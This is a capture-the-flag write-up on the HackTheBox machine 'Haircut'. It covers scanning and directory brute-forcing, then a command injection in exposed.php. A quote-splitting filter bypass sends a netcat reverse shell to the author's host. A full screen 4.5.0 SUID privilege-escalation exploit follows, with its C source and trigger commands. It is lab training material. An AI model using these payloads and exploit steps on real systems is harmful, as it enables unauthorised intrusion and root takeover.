---
title: Haircut - HackTheBox
published: true
---

![](assets/img/haircut-htb/icon.png)

**Hey Guys!** In this blogpost, we are going to pwn **Haircut** from [HackTheBox](https://www.hackthebox.eu). But before that, let me give you a brief overview of what we are going to do :

*   We first scan the box to find a **SSH** and **Web** service.
*   Enumerating the website, we find an interesting **php** file.
*   Then, we get a low privilege **shell** by exploiting a **command injection** vulnerability.
*   Finally, we get root by exploitting a **SUID bit** set binary.

With that said, let us begin.

# [](#header-1)SCANNING :

```
root@kali:~# nmap -sC -sV 10.10.10.24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 12:26 EST
Nmap scan report for 10.10.10.24
Host is up (0.58s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.24 seconds
```

We have done a **nmap** scan with version detection (-sV) and default scripts scan (-sC). 

It is revealed that ports 22 and 80 are open.

**OpenSSH 7.2p2 Ubuntu 4ubuntu2.2** is running on port 22 while **nginx 1.10.0** on port 80.

This should be enough in the scanning phase. Let us move to enumeration now.

# [](#header-1)ENUMERATING HTTP:

Since **HTTP** has large attack vector, let us begin with that.

By visiting the webpage through the browser, we get :

![](assets/img/haircut-htb/web-1.png)

Finding nothing interesting here, I decided to brute force for directories/files.

```
root@kali:~# gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirb/big.txt -x html,php -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.24
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2021/02/26 12:30:39 Starting gobuster
===============================================================
/hair.html (Status: 200)
/index.html (Status: 200)
/test.html (Status: 200)
/uploads (Status: 301)
===============================================================
2021/02/26 12:46:49 Finished
===============================================================
```

I used **gobuster** with a small wordlist from **dirb**'s **big.txt**. We find some files in result:

*   **hair.html**

![](assets/img/haircut-htb/web-2.png)

*   **test.html**

![](assets/img/haircut-htb/web-3.png)

*   **uploads**

![](assets/img/haircut-htb/web-4.png)

The **hair.html**, **test.html** did not give us something interesting. The **uploads** gives us a **403 forbidden** response.

Guess we have to use a little bigger wordlist.

```
root@kali:~# gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html,php -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.24
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2021/02/26 12:47:28 Starting gobuster
===============================================================
/index.html (Status: 200)
/uploads (Status: 301)
/test.html (Status: 200)
/hair.html (Status: 200)
/exposed.php (Status: 200)
===============================================================
2021/02/26 13:13:11 Finished
===============================================================
```

This time I used **dirbuster**'s **small.txt** wordlist. As you can see, now we have an extra **PHP** file called **exposed.php**

![](assets/img/haircut-htb/web-5.png)

It seems the **php** file is using **curl** to fetch a file. Let us check if we can include **remote** files too.

```
root@kali:~# cat test-2.html 
<!DOCTYPE html>
<html>
        <head></head>
        <body>
                <h1>Testing for remote inclusion</h1>
                <h2>By Nehal</h2>
        </body>
</html>
root@kali:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

I have made an **HTML** page and served it using **Python**'s local server.

![](assets/img/haircut-htb/web-6.png)

As you can see, the **test-2.html** file from my box is successfully fetched and is executed.

Now, it is time for exploitation.

# [](#header-1)EXPLOITATION:

Since we can include remote files, let us serve **php-reverse-shell** and see if we can get a shell back.

![](assets/img/haircut-htb/web-7.png)

Instead of running the php file, the box just prints the file contents, so we did not get a shell. Let us try some alternatives.

I put the request to my burp repeater to see if I can chain any command to the url. The common methods include :

### &lt;URL&gt; | &lt;cmd&gt;
### &lt;URL&gt; || &lt;cmd&gt;
### &lt;URL&gt; ; &lt;cmd&gt;
### &lt;URL&gt; &#96;&lt;cmd&gt;&#96; 

There are many other techniques too. However, in this case, the &#96;&lt;cmd&gt;&#96; worked.

![](assets/img/haircut-htb/web-8.png)

You can see, I have chained `id` command to the url and the output of the command is shown in the response.

Great. We can inject commands now.

Let us now check if we can get a shell.

![](assets/img/haircut-htb/web-9.png)

When I tried to use `nc` to get a reverse shell, it says we can not use it. Probably, there is a sort of filtering going on.

Let us see if we can bypass the filters.

There is a cheatsheet on command injection filter bypass on github. You can find it [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).

There is a way in which we insert quotations around the letters of the filtered keyword to bypass the filtering.

So, our payload will become : `n"c" 10.10.14.13 443 -e /bin/sh`. 

Set up a listener and see if this works.

![](assets/img/haircut-htb/web-10.png)

```
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.24] 41688
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@haircut:~/html$
```

As you can see, that worked and we are in. You can read the user flag now.

# [](#header-1)PRIVILEGE ESCALATION:

Let us begin by checking for **SUID** files.

```
www-data@haircut:~$ find / -type f -perm -4000 2>/dev/null
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```

A **trained eye** must have noticed something here. The **screen** binary with version **4.5.0** is vulnerable to a local privilege escalation.

There is an exploit for this on [exploit-db](https://www.exploit-db.com/exploits/41154).

Let us download the exploit in our local box and play with it a bit.

First, the exploit creates a **C** file **libhax.c**.

```
root@kali:~# cat libhax.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

The **C-file** changes the ownership of a file **/tmp/rootshell** to **root**. Then it sets the **SUID** bit set for the same file. After that, it deletes a shared object file **/etc/ld.so.preload**. We are going to generate the shared object file for **libhax.c**

Then the exploit creates another **C-file** called **rootshell.c**.

```
root@kali:~# cat rootshell.c 
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

This file just set the **UID** and **GID** to **0**. Then it calls the **/bin/sh** binary to get a shell.

Now, let us compile them and serve to the remote box.

```
root@kali:~# gcc -fPIC -shared -ldl -o libhax.so libhax.c
libhax.c: In function ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
root@kali:~# gcc -o rootshell rootshell.c
rootshell.c: In function ‘main’:
rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
root@kali:~# python3 -m http.server 80
\Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.24 - - [26/Feb/2021 13:36:35] "GET /libhax.so HTTP/1.1" 200 -
10.10.10.24 - - [26/Feb/2021 13:36:55] "GET /rootshell HTTP/1.1" 200 -
```

Ignore the warnings. As long as there is no error, we are good.

Let us do some magic now on the remote box.

First, we change our directory to `/etc` and we set the `umask` to **000**. Then we use vulnerable `screen` to link the **libhax.so** to the `/etc/ld.so.preload` that we deleted a moment ago. After that we trigger the binary with `screen -ls`. This should make our **/tmp/rootshell** to be owned by root and set the **SUID bit** for this. Now we just need to run the **rootshell** binary.

```
www-data@haircut:/tmp$ cd /etc
www-data@haircut:/etc$ umask 000
so"-data@haircut:/etc$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax. 
www-data@haircut:/etc$ screen -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@haircut:/etc$ /tmp/rootshell
# 
# 
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# passwd root
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
# su root
root@haircut:/etc# id && hostname
uid=0(root) gid=0(root) groups=0(root)
haircut
root@haircut:/etc# 
```

And that is it, we are **root**.

So that was **Haircut** from **HackTheBox**. 

**Thanks** for reading this far. Hope you liked it :)

I will see you in the next write-up. **PEACE**.

